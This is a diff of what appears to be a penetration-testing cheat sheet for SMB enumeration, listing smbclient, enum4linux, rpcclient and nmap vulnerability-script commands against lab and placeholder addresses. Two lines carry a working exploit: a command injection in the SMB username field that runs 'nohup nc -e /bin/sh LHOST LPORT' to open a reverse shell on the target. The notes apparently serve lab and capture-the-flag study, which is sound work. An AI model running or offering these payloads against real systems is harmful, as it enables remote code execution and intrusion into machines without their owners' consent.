@@ -14,16 +14,21 @@ https://github.com/absolomb/Pentesting/blob/master/guides/Initial%20Enumeration.
   smbclient -L "//10.10.185.43/" -U "guest"%| tee "recon/smbclient_10.10.185.43.txt"              
 
   smbclient -L x.x.x.x
+  
   smbmount //x.x.x.x/share /mnt –o username=hodor,workgroup=hodor
+  
   smbclient \\\\x.x.x.x\\share
   
   enum4linux -a ip
+  
   rpcclient -U "" x.x.x.x  #Anonymous bind using rpcclient / Null connect
+  
   smbclient //MOUNT/share #Connect to SMB share
 
   smbclient -U "/=&#92;&#96;nohup nc -e /bin/sh LHOST LPORT&#92;&#96;" -N -I ip //LAME/tmp
 
   nmap -T4 -sS -sC -Pn -A --script smb-vuln* ip
+  
   smbclient //ip/tmp
   logon "./=`nohup nc -e /bin/sh LHOST LPORT`"
 
